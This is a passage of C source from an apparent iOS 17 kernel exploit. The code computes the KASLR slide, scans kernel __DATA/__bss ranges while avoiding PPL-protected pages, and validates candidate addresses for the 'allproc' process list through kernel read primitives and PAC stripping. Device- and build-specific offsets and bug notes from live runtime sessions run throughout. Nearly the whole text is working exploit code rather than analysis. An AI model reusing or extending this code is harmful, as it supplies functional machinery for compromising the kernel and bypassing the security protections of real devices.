    uint32_t ncmds = *(uint32_t *)(hdr + 16);
    uint32_t offset = 32; /* sizeof(mach_header_64) */
    klog_scan("parsing %u load commands from kbase=0x%llx", ncmds, kbase);

    /* BUG FIX: Mach-O header in memory has UNSLID vmaddrs.
     * kbase is the SLID runtime address. We must compute the KASLR slide
     * from __TEXT's vmaddr and add it to all other segment vmaddrs.
     * Without this, scan_range_for_allproc reads from UNSLID addresses
     * which are unmapped → kernel data abort → PANIC.
     *
     * First pass: find __TEXT vmaddr to derive slide. */
    uint64_t macho_slide = 0;
    bool slide_found = false;
    {
        uint32_t off = 32;
        for (uint32_t i = 0; i < ncmds && off + 8 < 4096; i++) {
            uint32_t cmd_  = *(uint32_t *)(hdr + off);
            uint32_t sz_   = *(uint32_t *)(hdr + off + 4);
            if (sz_ == 0) break;
            if (cmd_ == 0x19) { /* LC_SEGMENT_64 */
                char seg_[17] = {0};
                memcpy(seg_, hdr + off + 8, 16);
                if (strcmp(seg_, "__TEXT") == 0) {
                    uint64_t text_vmaddr = *(uint64_t *)(hdr + off + 24);
                    macho_slide = kbase - text_vmaddr;
                    slide_found = true;
                    klog_scan("__TEXT vmaddr=0x%llx slide=0x%llx", text_vmaddr, macho_slide);
                    break;
                }
            }
            off += sz_;
        }
    }
    if (!slide_found) {
        klog_scan("cannot find __TEXT segment for slide calculation, aborting scan");
        return 0;
    }

    for (uint32_t i = 0; i < ncmds && offset + 8 < 4096; i++) {
        uint32_t cmd     = *(uint32_t *)(hdr + offset);
        uint32_t cmdsize = *(uint32_t *)(hdr + offset + 4);
        if (cmdsize == 0) break;

        if (cmd == 0x19) { /* LC_SEGMENT_64 */
            char segname[17] = {0};
            memcpy(segname, hdr + offset + 8, 16);
            uint64_t vmaddr = *(uint64_t *)(hdr + offset + 24);
            uint64_t vmsize = *(uint64_t *)(hdr + offset + 32);

            /* ONLY scan the plain __DATA segment.                          *
             * allproc is LIST_HEAD_INITIALIZER global → always in __DATA.  *
             * __PPLDATA/__LASTDATA are PPL-protected → reading panics.      *
             * __DATA_CONST is read-only init data  → allproc won't be there.*/
            bool is_safe_data = (strcmp(segname, "__DATA") == 0);
            if (!is_safe_data || !vmaddr || !vmsize) {
                offset += cmdsize;
                continue;
            }

            /* Apply KASLR slide: vmaddr in header is the UNSLID link
             * address; the actual runtime address is vmaddr + slide. */
            vmaddr += macho_slide;

            /* BUG #207 FIX: outer fileset __DATA starts at vmaddr, but the first
             * 0x8000 bytes (32KB) contain __PPLDATA + __KLDDATA — both PPL-protected
             * on A12Z (iPad8,9). Reading them via exploit causes kernel panic:
             * "Unexpected fault in kernel static region".
             *
             * Verified by offline kernelcache analysis (build 21D61):
             *   outer __DATA + 0x0000..0x4000 = __PPLDATA  (PPL-protected → PANIC)
             *   outer __DATA + 0x4000..0x8000 = __KLDDATA  (PPL-protected → PANIC)
             *   outer __DATA + 0x8000+        = __DATA.__data (safe to read)
             *
             * allproc lives in __DATA.__common which starts at outer __DATA+0x2b000.
             * Offline analysis shows top allproc candidate at outer __DATA+0x67f30.
             *
             * Bug #216: NARROWED scan range to __DATA.__common only.
             * Scanning ALL of __DATA causes many false-positive heap pointers
             * in __DATA.__data, leading to reads from zone metadata → panic.
             * __DATA.__common: outer __DATA + 0x2b000 to +0x7f000 (336 KB).
             * Add ±0x4000 margin → scan 0x27000 to 0x83000 (376 KB).
             * This covers allproc at +0x67f30 with plenty of margin.
             * Skip 0x8000 (PPL) + 0x1f000 (DATA.__data/lock_grp/percpu) = 0x27000. */
            const uint64_t COMMON_START = 0x63000ULL; /* Bug #292: bypass dangerous early __common; start near allproc at +0x67F30 */
            const uint64_t COMMON_END   = 0x70000ULL; /* Bug #292: narrow 32KB window around allproc; avoids metadata zone reads */
            if (vmsize <= COMMON_START) {
                klog_scan("__DATA vmsize=0x%llx too small for __common scan, skipping", vmsize);
                offset += cmdsize;
                continue;
            }
            uint64_t scan_vm_start = vmaddr + COMMON_START;
            uint64_t scan_end_limit = (COMMON_END < vmsize) ? COMMON_END : vmsize;
            uint64_t scan_size = scan_end_limit - COMMON_START;

            klog_scan("scanning __DATA.__common: base=0x%llx common_start=0x%llx start=0x%llx size=0x%llx",
                      vmaddr, COMMON_START, scan_vm_start, scan_size);

            uint64_t found = scan_range_for_allproc(scan_vm_start, scan_size, kbase);
            if (found) return found;
            klog_scan("__DATA: allproc not found");
        }
        offset += cmdsize;
    }

    klog_scan("allproc NOT FOUND in __DATA segment");
    return 0;
}

/* Bug #219 fix + Bug #226b fix:
 * Scan the inner kernel's __DATA.__common and __DATA.__bss directly.
 * scan_range_for_allproc() correctly skips non-heap values via is_heap_ptr()
 * and only attempts costly validate_allproc() on genuine heap pointers.
 *
 * Inner kernel layout (build 21D61, all offsets from outer kbase):
 *   __PPLDATA:       kbase + 0x3198000  size 0x4000  (PPL-protected, skip!)
 *   __DATA.__common: kbase + 0x31c3000  size ~0x54000 (safe, 336 KB)
 *   __DATA.__bss:    kbase + 0x3217000  size ~0x2a000 (safe, 168 KB)
 *
 * Bug #226b: CRITICAL — The full __DATA.__common scan is DANGEROUS.
 * The early part of __DATA.__common (offsets 0x0..0x5000) contains
 * heap-looking pointers to unmapped zone pages. ds_kread_checked()
 * cannot detect unmapped pages — the kernel panics in copyout()
 * (Kernel data abort) before getsockopt can return.
 *
 * allproc is at outer __DATA + 0x67F30 = kbase + 0x31FFF30, which is
 * at offset 0x3CF30 within __DATA.__common (68% through the section).
 * Scanning from the START panics at chunk 2 before reaching chunk 15.
 *
 * FIX: scan a NARROW WINDOW (32KB) around the known offset FIRST.
 * Only fall back to full __DATA.__common if narrow window fails.
 * The narrow window avoids the dangerous early heap pointers.
 */
static uint64_t scan_allproc_known_range(uint64_t kbase) {
    if (!kbase) return 0;

    struct {
        uint64_t start_off;
        uint64_t size;
        const char *label;
    } ranges[] = {
        /* Bug #239 / Bug #395: SWAPPED ORDER — __bss first, __common second.
         * Session 25 confirmed allproc at kbase+0x321C408 (in __bss range), but
         * fresh runtime after Bug #394 exposed additional heap-like candidates at
         * kbase+0x3213678 / +0x3213680, i.e. ~0x4A00 BELOW the old scan start.
         * Expand the safe __bss window downward so the default scan also covers
         * these nearby heads without enabling the broad Mach-O parser.
         *
         * Old window: [0x321C000 .. 0x322C000)
         * New window: [0x3213000 .. 0x322B000)
         *
         * This keeps the scan constrained to ~96KB of inner __DATA.__bss while
         * covering both the historical 0x321C4xx region and the new 0x32136xx
         * boot-specific candidates. */
        { 0x3213000ULL, 0x18000ULL, "__DATA.__bss_allproc" },
        /* SECOND: wider __common range — only used as fallback.
         * Bug #239: may cause panic on some boots. */
        { 0x31FC000ULL, 0x10000ULL, "__DATA.__common_target" },
    };

    for (size_t r = 0; r < sizeof(ranges)/sizeof(ranges[0]); r++) {
        uint64_t scan_start = kbase + ranges[r].start_off;
        filelog_write("[allproc] scan %s: 0x%llx..0x%llx (0x%llx bytes)",
                      ranges[r].label, scan_start, scan_start + ranges[r].size,
                      ranges[r].size);
        uint64_t found = scan_range_for_allproc(scan_start, ranges[r].size, kbase);
        if (found) {
            filelog_write("[allproc] scan FOUND in %s: addr=0x%llx offset=0x%llx",
                          ranges[r].label, found, found - kbase);
            return found;
        }
        filelog_write("[allproc] scan %s: not found", ranges[r].label);
    }
    return 0;
}

/* Bug #239b + #240: Direct allproc validation with SMRQ-aware chain walk.
 *
 * iOS 17 uses SMRQ (SMR Queue) singly-linked lists for allproc.
 * *(allproc) points to the SMRQ list_entry WITHIN the first proc,
 * which is at proc_base + list_off (NOT proc_base itself).
 *
 * Session 25d proved:
 *   list_off = 0xb0  (p_list SMRQ_LIST_ENTRY within proc struct)
 *   pid at proc + 0x60
 *   *(entry_ptr) = next_entry_ptr (singly linked, no le_prev)
 *
 * The old v2 hardcoded list_off=0x00 and relied on le_prev backlink,
 * which only worked coincidentally for a different list (pgrp/session)
 * at proc+0x00.  Chain was only 2 entries → validation failed.
 *
 * New v2 tries multiple list_off values and walks the chain correctly
 * for both SMRQ and BSD list interpretations. */
static bool validate_direct_allproc_v2_with_layout(uint64_t candidate, uint32_t list_off) {
    uint64_t raw_head = 0;
    if (!ds_kread64_checked(candidate, &raw_head)) return false;
    uint64_t entry_ptr = pac_strip(raw_head);
    uint32_t pid_probe_offs[4] = {0};
    size_t pid_probe_count = build_pid_offset_candidates(pid_probe_offs, 4);

    /* Bug #258B: entry_ptr may be DATA-resident (proc0+list_off) when
     * kernel_task is at HEAD. Check both heap and DATA interpretations.
     * Also handle circular list sentinel: entry_ptr == candidate means
     * empty list (STP X,X,[X,#0] init pattern). */
    if (entry_ptr == candidate) {
        filelog_write("[allproc] direct_v2: list_off=0x%x entry==head (empty circular list)", list_off);
        return false;
    }

    bool entry_in_data = is_kernel_data_ptr(entry_ptr);
    /* Bug #445: entry_ptr may be in zone_map below safe_min (e.g. allproc head from XPF offset) */
    if (!is_heap_ptr_relaxed(entry_ptr) && !entry_in_data && !is_in_zone_map(entry_ptr)) return false;

    /* Compute first proc base:
     * SMRQ (list_off > 0): entry_ptr = proc_base + list_off
     * BSD  (list_off == 0): entry_ptr = proc_base */
    uint64_t first_proc = entry_ptr;
    if (list_off > 0 && entry_ptr >= list_off) {
        first_proc = entry_ptr - list_off;
    }
    if (!is_heap_ptr(first_proc) && !is_kernel_data_ptr(first_proc) && !is_in_zone_map(first_proc)) return false; /* Bug #445 */

    /* Bug #391: direct_v2 must not hardcode +0x60 as p_pid.
     * Fresh runtime after Bug #390 showed candidate 0x321C480 has garbage at
     * +0x60 but valid pid=0 at the trusted iOS 17 offset +0xD8. Hardcoding
     * +0x60 makes direct_v2 reject the head before it can even log chain data. */
    uint32_t active_pid_off = 0;
    uint32_t first_pid = 0;
    for (size_t pi = 0; pi < pid_probe_count; pi++) {
        uint32_t probe_pid = 0;
        uint32_t poff = pid_probe_offs[pi];
        if (!poff) continue;
        if (!ds_kread32_checked(first_proc + poff, &probe_pid)) continue;
        if (!is_plausible_pid(probe_pid)) continue;
        active_pid_off = poff;
        first_pid = probe_pid;
        break;
    }
    if (!active_pid_off) return false;

    /* Bug #258B: If first proc is DATA-resident (PID 0 = kernel_task),
     * skip ahead to the next entry in the chain for chain validation.
     * proc0 at HEAD is valid but chain_len should count from second proc. */
    uint64_t walk_start = first_proc;
    if (entry_in_data && first_pid == 0) {
        /* Read next entry from proc0+list_off: circular list next */
        uint64_t next_entry_raw = 0;
        if (!ds_kread64_checked(first_proc + list_off, &next_entry_raw)) return false;
        uint64_t next_entry = pac_strip(next_entry_raw);
        /* Sentinel check: if next_entry == candidate, only kernel_task in list */
        if (next_entry == candidate) return false;
        if (!is_heap_ptr_relaxed(next_entry) && !is_kernel_data_ptr(next_entry) && !is_in_zone_map(next_entry)) return false; /* Bug #445 */
        uint64_t next_proc = next_entry;
        if (list_off > 0 && next_entry >= list_off) next_proc = next_entry - list_off;
        if (!is_heap_ptr(next_proc) && !is_kernel_data_ptr(next_proc) && !is_in_zone_map(next_proc)) return false; /* Bug #445 */
        walk_start = next_proc;
        filelog_write("[allproc] direct_v2: list_off=0x%x DATA proc0 at HEAD, walking from next=0x%llx",
                      list_off, next_proc);
    }

    /* For list_off == 0 (BSD LIST): also verify le_prev backlink */
    if (list_off == 0 && !entry_in_data) {
        uint64_t le_prev = 0;
        if (!ds_kread64_checked(first_proc + 0x08, &le_prev)) return false;
        uint64_t le_prev_stripped = pac_strip(le_prev);
        if (le_prev_stripped != candidate) {
            filelog_write("[allproc] direct_v2: list_off=0 le_prev=0x%llx != candidate=0x%llx, skip",
                          le_prev_stripped, candidate);
            return false;
        }
    }

    /* Walk the chain. For each entry:
     * proc_base = cur_entry - list_off  (or cur_entry for list_off=0)
     * PID at proc_base + 0x60
     * next_entry = *(cur_entry)  (le_next / smrq_next is first field) */
    uint64_t cur_proc = walk_start;
    int chain_len = 0;
    uint32_t seen_pids[64];
    int unique_pids = 0;
    uint32_t max_pid_seen = 0;
    uint64_t visited[64];
    int nvisited = 0;

    /* Bug #445: also allow procs in zone_map below safe_min for initial chain validation */
    for (int i = 0; i < 50 && (is_heap_ptr(cur_proc) || is_kernel_data_ptr(cur_proc) || is_in_zone_map(cur_proc)); i++) {
        /* Cycle detection */
        bool cycle = false;
        for (int v = 0; v < nvisited; v++) {
            if (visited[v] == cur_proc) { cycle = true; break; }
        }
        if (cycle) break;
        if (nvisited < 64) visited[nvisited++] = cur_proc;

        uint32_t pid = 0;
        if (!ds_kread32_checked(cur_proc + active_pid_off, &pid)) break;
        if (!is_plausible_pid(pid)) break;

        /* Track unique pids */
        bool seen = false;
        for (int j = 0; j < unique_pids; j++) {
            if (seen_pids[j] == pid) { seen = true; break; }
        }
        if (!seen && unique_pids < 64) seen_pids[unique_pids++] = pid;
        if (pid > max_pid_seen) max_pid_seen = pid;

        chain_len++;

        /* Read next entry pointer from list_entry at proc + list_off */
        uint64_t next_raw = 0;
        if (!ds_kread64_checked(cur_proc + list_off, &next_raw)) break;
        uint64_t next_entry = pac_strip(next_raw);
        /* Bug #258A: circular list sentinel — entry points back to &allproc. */
        if (next_entry == candidate) break;  /* reached head → end of circular list */
        /* Bug #445: allow zone-map next entries below safe_min */
        if ((!is_heap_ptr_relaxed(next_entry) && !is_kernel_data_ptr(next_entry) && !is_in_zone_map(next_entry)) ||
            next_entry == (cur_proc + list_off)) break;

        /* Compute next proc base */
        uint64_t next_proc;
        if (list_off > 0 && next_entry >= list_off) {
            next_proc = next_entry - list_off;
        } else {
            next_proc = next_entry;
        }
        if ((!is_heap_ptr(next_proc) && !is_kernel_data_ptr(next_proc) && !is_in_zone_map(next_proc)) || next_proc == cur_proc) break; /* Bug #445 */
        cur_proc = next_proc;
    }

    pid_t ourpid = getpid();
    filelog_write("[allproc] direct_v2: candidate=0x%llx list_off=0x%x pid_off=0x%x chain=%d unique_pids=%d first_pid=%u max_pid=%u ourpid=%d",
                  candidate, list_off, active_pid_off, chain_len, unique_pids, first_pid, max_pid_seen, ourpid);

    /* Bug #254: runtime screenshot after Bug #253 showed that relaxed-head
     * admission allowed direct_v2 to accept a false-positive sublist with
     * only a handful of low PIDs (e.g. 0/13/15/16...) that never reached our
     * app pid range.  Real allproc on a live system must quickly expose PID
     * diversity and reach current userland pid values.
     * Bug #258B: when proc0 (PID 0) is at HEAD in DATA, walk_start skips it,
     * so first_pid of the walked chain is NOT 0. Relax first_pid != 0 check
     * when we know proc0 was skipped (entry_in_data && original first_pid==0). */
    bool first_pid_ok = (first_pid != 0) || entry_in_data;

    /* Bug #393: kernel-only PID=0 chain shortcut is unsafe on 21D61.
     * Fresh runtime showed direct_v2 SUCCESS on a kernel-only chain that later
     * led ourproc() into invalid traversal and panic. Do not accept kernel-only
     * chains here; require real PID diversity or PID-probe evidence below. */
    bool is_ios17_kernel_chain = (chain_len >= 2 && unique_pids <= 2 && first_pid == 0 && max_pid_seen == 0);

    if (is_ios17_kernel_chain) {
        filelog_write("[allproc] Bug #393: kernel-only chain rejected (list=0x%x pid_off=0x%x) — waiting for diverse/PID-probed candidate",
                      list_off, active_pid_off);
    }

    if (chain_len >= 8 && unique_pids >= 5 && first_pid_ok && max_pid_seen >= (uint32_t)ourpid) {
        /* Set global offsets — confirmed by chain walk with this layout */
        PROC_LIST_OFFSET = list_off;
        PROC_NEXT_OFFSET = 0x00;
        PROC_PREV_OFFSET = 0x08;
        PROC_PID_OFFSET = active_pid_off;
        g_direct_layout_set = true;
        g_kernproc_addr = candidate;

        filelog_write("[allproc] direct_v2 SUCCESS: list=0x%x next=0x00 prev=0x08 pid=0x%x", list_off, active_pid_off);
        return true;
    }

    /* Bug #291: some real direct candidates produce a good chain shape,
     * but PID offset differs from the default 0x60.  Instead of rejecting
     * immediately, probe common PID offsets on this exact forward chain and
     * accept only if we can actually find our PID with sufficient diversity. */
    if (chain_len >= 8) {
        uint64_t chain_procs[512];
        int chain_count = 0;
        uint64_t probe_cur = walk_start;
        uint64_t probe_seen[512];
        int probe_seen_n = 0;

        for (int i = 0; i < 512 && probe_cur; i++) {
            if (!is_proc_chain_ptr(probe_cur)) break;

            bool cycle = false;
            for (int v = 0; v < probe_seen_n; v++) {
                if (probe_seen[v] == probe_cur) {
                    cycle = true;
                    break;
                }
            }
            if (cycle) break;
            if (probe_seen_n < 512) probe_seen[probe_seen_n++] = probe_cur;
            if (chain_count < 512) chain_procs[chain_count++] = probe_cur;

            uint64_t next_raw = 0;
            if (!ds_kread64_checked(probe_cur + list_off, &next_raw)) break;
            uint64_t next_entry = pac_strip(next_raw);
            if (!next_entry || next_entry == candidate) break;

            uint64_t next_proc = next_entry;
            if (list_off > 0 && next_entry >= list_off) next_proc = next_entry - list_off;
            if (next_proc == probe_cur) break;
            probe_cur = next_proc;
        }

        static const uint32_t probe_pid_offs[] = {
            0x60, 0xd8, 0x10, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0x18
        };

        for (int oi = 0; oi < (int)(sizeof(probe_pid_offs)/sizeof(probe_pid_offs[0])); oi++) {
            uint32_t poff = probe_pid_offs[oi];
            int plausible_cnt = 0;
            int unique_nonzero = 0;
            uint32_t unique_vals[32];
            bool found_our = false;

            for (int ci = 0; ci < chain_count; ci++) {
                uint32_t pid = 0;
                if (!ds_kread32_checked(chain_procs[ci] + poff, &pid)) continue;
                if (!is_plausible_pid(pid)) continue;
                plausible_cnt++;
                if (pid == (uint32_t)ourpid) found_our = true;
                if (pid > 0) {
                    bool seen = false;
                    for (int u = 0; u < unique_nonzero; u++) {
                        if (unique_vals[u] == pid) {
                            seen = true;
                            break;
                        }
                    }
                    if (!seen && unique_nonzero < 32) unique_vals[unique_nonzero++] = pid;
                }
            }

            filelog_write("[allproc] Bug #291: direct pid-off probe list=0x%x poff=0x%x chain=%d plausible=%d unique_nonzero=%d found_ourpid=%d",
                          list_off, poff, chain_count, plausible_cnt, unique_nonzero, (int)found_our);

            if (found_our && plausible_cnt >= 8 && unique_nonzero >= 4) {
                uint32_t old_off = PROC_PID_OFFSET;
                PROC_PID_OFFSET = poff;
                PROC_LIST_OFFSET = list_off;
                PROC_NEXT_OFFSET = 0x00;
                PROC_PREV_OFFSET = 0x08;
                g_direct_layout_set = true;
                g_kernproc_addr = candidate;
                filelog_write("[allproc] Bug #291: direct_v2 ACCEPT via PID probe: list=0x%x pid_off=0x%x (old=0x%x)",
                              list_off, poff, old_off);
                return true;
            }
        }
    }

    return false;
}

/* Bug #268: detect_kernproc_variable false-positive hardening.
 * Some candidates expose kernel_task (PID 0) and a short linked chain that is
 * not the real allproc process list. Before accepting kernproc, verify that a
 * forward walk from kernel_task with the discovered pid offset yields enough
 * PID diversity, or directly reaches our PID. */
static bool validate_kernproc_forward_chain(uint64_t kernproc_base, uint32_t pid_off, pid_t ourpid) {
    if (!kernproc_base || !pid_off) return false;

    int best_chain_len = 0;
    int best_unique_n = 0;
    bool best_found_ourpid = false;
    uint32_t best_next_ff = 0x00;

    for (uint32_t next_ff = 0x00; next_ff <= 0x08; next_ff += 0x08) {
        uint64_t cur = kernproc_base;
        uint64_t visited[256];
        int visited_n = 0;
        uint32_t unique_pids[32];
        int unique_n = 0;
        int chain_len = 0;
        bool found_ourpid = false;

        for (int i = 0; i < 256 && cur; i++) {
            /* Bug #443: use is_proc_chain_ptr (= is_heap_ptr_relaxed || is_in_zone_map ||
             * is_kernel_data_ptr when direct layout) so early kernel threads below
             * zone_safe_min (GEN0 region) are not rejected, fixing chain=11 cutoff. */
            bool ptr_ok = is_proc_chain_ptr(cur) || (i == 0 && is_kptr(cur));
            if (!ptr_ok) break;

            bool cycle = false;
            for (int v = 0; v < visited_n; v++) {
                if (visited[v] == cur) {
                    cycle = true;
                    break;
                }
            }
            if (cycle) break;
            if (visited_n < (int)(sizeof(visited)/sizeof(visited[0]))) {
                visited[visited_n++] = cur;
            }

            uint32_t pid = 0;
            if (!read_proc_pid_checked(cur, pid_off, &pid)) break;
            if (!is_plausible_pid(pid) && !(i == 0 && pid == 0)) break;

            chain_len++;
            if (pid == (uint32_t)ourpid) {
                found_ourpid = true;
                break;
            }
            if (pid > 0) {
                bool seen = false;
                for (int u = 0; u < unique_n; u++) {
                    if (unique_pids[u] == pid) {
                        seen = true;
                        break;
                    }
                }
                if (!seen && unique_n < (int)(sizeof(unique_pids)/sizeof(unique_pids[0]))) {
                    unique_pids[unique_n++] = pid;
                }
            }

            uint64_t raw_next = 0;
            if (!kread64_checked_local(cur + next_ff, &raw_next)) break;
            uint64_t next = normalize_proc_link_target_with_pid(raw_next, 0x00, pid_off);
            if (!next) next = fallback_proc_link_target(raw_next);
            if (!next || next == cur) break;
            /* Bug #443: same fix for the continuation pointer */
            if (!is_proc_chain_ptr(next)) break;
            cur = next;
        }

        filelog_write("[allproc] Bug #268: kernproc chain validate: next_ff=0x%x len=%d unique_nonzero=%d found_ourpid=%d pid_off=0x%x",
                      next_ff, chain_len, unique_n, (int)found_ourpid, pid_off);

        bool better = false;
        if (found_ourpid && !best_found_ourpid) {
            better = true;
        } else if (found_ourpid == best_found_ourpid) {
            if (chain_len > best_chain_len) {
                better = true;
            } else if (chain_len == best_chain_len && unique_n > best_unique_n) {
                better = true;
            }
        }
        if (better) {
            best_chain_len = chain_len;
            best_unique_n = unique_n;
            best_found_ourpid = found_ourpid;
            best_next_ff = next_ff;
        }
    }

    if (best_found_ourpid) {
        if (best_next_ff != PROC_NEXT_OFFSET) {
            filelog_write("[allproc] Bug #414: kernproc chain selected next_ff=0x%x (was 0x%x)",
                          best_next_ff, PROC_NEXT_OFFSET);
        }
        return true;
    }

    /* Bug #389: Session 26 fresh runtime proved the opposite of Bug #373:
     * a false-positive kernproc candidate at kbase+0x321C400 satisfied the
     * le_prev back-reference and exposed a long PID-0-only forward chain, but
     * ourproc() then walked only pid=0 objects and never reached userland.
     *
     * Treat PID-0-only forward chains as NON-PROOF. Real acceptance now needs
     * either direct evidence of our PID or enough nonzero PID diversity. This
     * forces the resolver to continue toward safer candidates / seed-local scan
     * instead of prematurely locking onto a kernel-only sublist. */
    return (best_chain_len >= 20 && best_unique_n >= 8);
}

static bool validate_kernproc_backward_chain(uint64_t kernproc_base, uint32_t pid_off, pid_t ourpid) {
    if (!kernproc_base || !pid_off) return false;

    uint64_t cur = kernproc_base;
    uint64_t visited[256];
    int visited_n = 0;
    uint32_t unique_pids[32];
    int unique_n = 0;
    int chain_len = 0;
    bool found_ourpid = false;

    for (int i = 0; i < 256 && cur; i++) {
        /* Bug #443: use is_proc_chain_ptr to allow GEN0-region kernel procs below zone_safe_min */
        bool ptr_ok = is_proc_chain_ptr(cur) || (i == 0 && is_kptr(cur));
        if (!ptr_ok) break;

        bool cycle = false;
        for (int v = 0; v < visited_n; v++) {
            if (visited[v] == cur) {
                cycle = true;
                break;
            }
        }
        if (cycle) break;
        if (visited_n < (int)(sizeof(visited)/sizeof(visited[0]))) {
            visited[visited_n++] = cur;
        }

        uint32_t pid = 0;
        if (!read_proc_pid_checked(cur, pid_off, &pid)) break;
        if (!is_plausible_pid(pid) && !(i == 0 && pid == 0)) break;

        chain_len++;
        if (pid == (uint32_t)ourpid) {
            found_ourpid = true;
            break;
        }
        if (pid > 0) {
            bool seen = false;
            for (int u = 0; u < unique_n; u++) {
                if (unique_pids[u] == pid) {
                    seen = true;
                    break;
                }
            }
            if (!seen && unique_n < (int)(sizeof(unique_pids)/sizeof(unique_pids[0]))) {
                unique_pids[unique_n++] = pid;
            }
        }

        uint64_t prev_raw = 0;
        if (!ds_kread64_checked(cur + 0x08, &prev_raw)) break;
        uint64_t prev = pac_strip(prev_raw);
        /* Bug #443: use is_proc_chain_ptr for backward-walk continuations too */
        if (!prev || !is_proc_chain_ptr(prev) || prev == cur) break;
        cur = prev;
    }

    filelog_write("[allproc] Bug #288: kernproc backward validate: len=%d unique_nonzero=%d found_ourpid=%d pid_off=0x%x",
                  chain_len, unique_n, (int)found_ourpid, pid_off);

    if (found_ourpid) return true;
    return (chain_len >= 20 && unique_n >= 8);
}

static bool probe_kernproc_backward_pid_offset_for_ourpid(uint64_t kernproc_base, pid_t ourpid, uint32_t *found_off) {
    if (!kernproc_base || !ourpid || !found_off) return false;

    static const uint32_t probe_pid_offs[] = {
        0x60, 0xd8, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0x88, 0x10, 0x18
    };

    for (int oi = 0; oi < (int)(sizeof(probe_pid_offs)/sizeof(probe_pid_offs[0])); oi++) {
        uint32_t poff = probe_pid_offs[oi];
        uint64_t cur = kernproc_base;
        uint64_t visited[128];
        int visited_n = 0;
        int chain_len = 0;
        bool found_our = false;

        for (int i = 0; i < 128 && cur; i++) {
            if (!is_heap_ptr_relaxed(cur) &&
                !(g_direct_layout_set && is_kernel_data_ptr(cur)) &&
                !(i == 0 && is_kptr(cur))) break;

            bool cycle = false;
            for (int v = 0; v < visited_n; v++) {
                if (visited[v] == cur) {
                    cycle = true;
                    break;
                }
            }
            if (cycle) break;
            if (visited_n < (int)(sizeof(visited)/sizeof(visited[0]))) {
                visited[visited_n++] = cur;
            }

            uint32_t pid = 0;
            if (!read_proc_pid_checked(cur, poff, &pid)) break;
            if (!is_plausible_pid(pid) && !(i == 0 && pid == 0)) break;

            chain_len++;
            if (pid == (uint32_t)ourpid) {
                found_our = true;
                break;
            }

            uint64_t prev_raw = 0;
            if (!ds_kread64_checked(cur + 0x08, &prev_raw)) break;
            uint64_t prev = pac_strip(prev_raw);
            if (!prev || (!is_heap_ptr_relaxed(prev) && !(g_direct_layout_set && is_kernel_data_ptr(prev))) || prev == cur) break;
            cur = prev;
        }

        filelog_write("[allproc] Bug #289: backward pid-off probe 0x%x -> len=%d found_ourpid=%d",
                      poff, chain_len, (int)found_our);

        if (found_our) {
            *found_off = poff;
            return true;
        }
    }

    return false;
}

/* Bug #255: Detect kernproc variable (pointer to kernel_task, PID 0).
 *
 * Direct evidence from runtime (build 38): candidate 0x3213680 stores a SMRQ
 * entry pointer into kernel_task (PID 0 at proc_base+0x60).  kernel_task is
 * at the TAIL of allproc's BSD LIST, so forward walk yields chain=1 and
 * direct_v2 rightly rejects it as "not enough PID diversity".
 *
 * However, from kernel_task we can walk BACKWARD through allproc via the BSD
 * LIST le_prev at proc+0x08.  In XNU's LIST_ENTRY:
 *   le_prev = &prev_proc->le_next = prev_proc + 0  (since le_next is first field)
 * So prev_proc = le_prev, and we keep going until le_prev points to kdata
 * (= &allproc.lh_first) which terminates the walk.
 *
 * Detection:
 *   *(candidate) may be proc_base (direct) or proc_base+0xb0 (SMRQ entry).
 *   Try both: if PID at +0x60 == 0, it's a match.
 *   Validate p_proc_ro at +0x18 as an extra guard.
 *   Check le_prev at proc_base+0x08 is non-zero and kernel-valid. */
static bool detect_kernproc_variable(uint64_t candidate) {
    static bool s_skip_logged = false;
    if (!ds_allow_kernproc_direct()) {
        if (!s_skip_logged) {
            filelog_write("[allproc] Bug #422: kernproc direct path disabled by default on 21D61 "
                          "(set DS_ENABLE_KERNPROC_DIRECT=1 for manual probes); "
                          "skipping candidate 0x%llx",
                          candidate);
            s_skip_logged = true;
        }
        return false;
    }

    uint64_t raw_head = 0;
    if (!ds_kread64_checked(candidate, &raw_head)) return false;
    uint64_t entry_ptr = pac_strip(raw_head);
    if (!is_heap_ptr_relaxed(entry_ptr)) return false;

    /* Bug #308: detect_kernproc_variable must not probe pid fields on a fake
     * SMRQ/direct head before the head itself looks structurally plausible.
     * Fresh session 25f showed false direct candidate 0x3213ec8 with
     * entry_ptr=0xffffffe2613416a0. interp2 then read (entry_ptr-0xb0)+0x60,
     * i.e. 0xffffffe261341650, which exactly matched the next bug_type 210
     * panic address. Reuse the same early structural idea as val_ap: only try
     * the direct proc-base interpretation if the head exposes a plausible
     * direct link, and only try the SMRQ proc_base+0xb0 interpretation if the
     * entry itself exposes a plausible kernel link. */
    uint64_t q0 = 0, q8 = 0;
    bool q0_ok = false, q8_ok = false;
    bool direct_links_ok = staged_head_has_heap_link(entry_ptr, &q0, &q0_ok, &q8, &q8_ok);
    bool smrq_links_ok = staged_head_has_kptr_link(entry_ptr, NULL, NULL, NULL, NULL);

    filelog_write("[allproc] kernproc detect: candidate=0x%llx entry_ptr=0x%llx",
                  candidate, entry_ptr);

    /* Try two interpretations to find PID 0 */
    uint64_t proc_base = 0;
    bool found_pid0 = false;

    /* Interpretation 1: entry_ptr IS proc_base (direct kernproc pointer) */
    if (direct_links_ok) {
        uint32_t pid = 0xFFFFFFFF;
        bool ok = ds_kread32_checked(entry_ptr + 0x60, &pid);
        filelog_write("[allproc] kernproc interp1: ptr=0x%llx+0x60 kread=%d pid=%u",
                      entry_ptr, (int)ok, pid);
        if (ok && pid == 0) {
            proc_base = entry_ptr;
            found_pid0 = true;
        }
    } else {
        filelog_write("[allproc] Bug #308: skip interp1 for fake direct head=0x%llx "
                      "(q0=0x%llx ok=%d q8=0x%llx ok=%d)",
                      entry_ptr, q0, (int)q0_ok, q8, (int)q8_ok);
    }

    /* Bug #349: interp1b — +0x60 can be a non-PID field on some boots (e.g. iOS 17
     * allproc first-proc has garbage at +0x60 but PID=0 at PROC_PID_OFFSET=0xd8).
     * If interp1 failed with non-zero at +0x60, retry at PROC_PID_OFFSET. */
    if (!found_pid0 && direct_links_ok && PROC_PID_OFFSET != 0x60 && PROC_PID_OFFSET != 0) {
        uint32_t pid = 0xFFFFFFFF;
        bool ok = ds_kread32_checked(entry_ptr + PROC_PID_OFFSET, &pid);
        filelog_write("[allproc] Bug #349: kernproc interp1b: ptr=0x%llx+0x%x kread=%d pid=%u",
                      entry_ptr, PROC_PID_OFFSET, (int)ok, pid);
        if (ok && pid == 0) {
            proc_base = entry_ptr;
            found_pid0 = true;
        }
    }

